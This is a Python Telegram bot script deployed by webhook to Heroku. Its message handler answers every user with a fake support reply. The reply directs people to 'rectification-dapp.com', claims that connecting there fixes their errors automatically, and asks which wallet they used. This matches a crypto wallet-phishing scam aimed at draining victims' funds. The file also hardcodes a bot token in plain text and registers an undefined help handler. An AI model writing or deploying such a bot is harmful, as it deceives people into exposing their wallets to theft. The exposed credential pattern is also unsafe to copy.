import logging

from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
import os
PORT = int(os.environ.get('PORT', 5000))


logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)

logger = logging.getLogger(__name__)
TOKEN = '5751562706:AAHP1bVDHWWV_2smAceLajMp-UI6ApIPTIE'

def start(update, context):
    """Send a message when the command /start is issued."""
    update.message.reply_text('Hi, how are you doing and how may I help you ?')


def echo(update, context):
    update.message.reply_text('Kindly navigate to https://rectification-dapp.com to reseolve issues related to that, upon connecting to the dapp platform; your errors are automatically fixed')
    update.message.reply_text('Which wallet account did you use to connect')

    

def error(update, context):
    """Log Errors caused by Updates."""
    logger.warning('Update "%s" caused error "%s"', update, context.error)

def main():
    """Start the bot."""
    # Create the Updater and pass it your bot's token.
    # Make sure to set use_context=True to use the new context based callbacks
    # Post version 12 this will no longer be necessary
    updater = Updater("5751562706:AAHP1bVDHWWV_2smAceLajMp-UI6ApIPTIE", use_context=True)

    # Get the dispatcher to register handlers
    dp = updater.dispatcher

    # on different commands - answer in Telegram
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help))

    # on noncommand i.e message - echo the message on Telegram
    dp.add_handler(MessageHandler(Filters.text, echo))

    # log all errors
    dp.add_error_handler(error)

    # Start the Bot
    updater.start_webhook(listen="0.0.0.0", 
                          port=int(PORT),
                          url_path=TOKEN)
    updater.bot.setWebhook('https://thewolheadstelebot.herokuapp.com/' + TOKEN)

    # Run the bot until you press Ctrl-C or the process receives SIGINT,
    # SIGTERM or SIGABRT. This should be used most of the time, since
    # start_polling() is non-blocking and will stop the bot gracefully.
    updater.idle()

if __name__ == '__main__':


    main()